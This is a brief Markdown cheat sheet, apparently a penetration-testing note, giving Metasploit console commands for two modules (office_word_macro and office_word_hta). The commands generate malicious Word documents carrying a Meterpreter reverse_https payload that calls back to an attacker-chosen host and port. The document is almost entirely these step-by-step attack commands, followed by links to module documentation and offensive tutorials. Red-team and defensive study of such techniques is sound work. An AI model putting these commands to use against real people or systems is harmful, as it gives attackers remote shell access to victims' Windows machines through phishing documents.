# Metasploit

TODO: Finish the rest

## 01 - VBA Macro

```
msf > use exploit/windows/fileformat/office_word_macro

msf exploit(windows/fileformat/office_word_macro) > set payload windows/x64/meterpreter/reverse_https

msf exploit(windows/fileformat/office_word_macro) > set customtemplate /path/to/document.docx

msf exploit(windows/fileformat/office_word_macro) > set lhost <IP>

msf exploit(windows/fileformat/office_word_macro) > set lport <PORT>

msf exploit(windows/fileformat/office_word_macro) > run
```

## 02 - VBA Macro with HTA

```
msf > use exploit/windows/fileformat/office_word_hta

msf exploit(windows/fileformat/office_word_hta) > set payload windows/x64/meterpreter/reverse_https

msf exploit(windows/fileformat/office_word_hta) > set lhost <IP>

msf exploit(windows/fileformat/office_word_hta) > set lport <PORT>

msf exploit(windows/fileformat/office_word_hta) > run
```

---
## References

### Rapid7

- [Rapid7: Metasploit Framework - Exploit FileFormat Office Word Macro](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md)

### Hacking Articles

- [Hacking Articles: Multiple Ways to Exploit Windows Systems using Macros](https://www.hackingarticles.in/multiple-ways-to-exploit-windows-systems-using-macros/)

### Network Intelligence

- [Network Intelligence: Getting System Access Using Malicious Word File](https://networkintelligence.ai/getting-system-access-using-malicious-word-file/)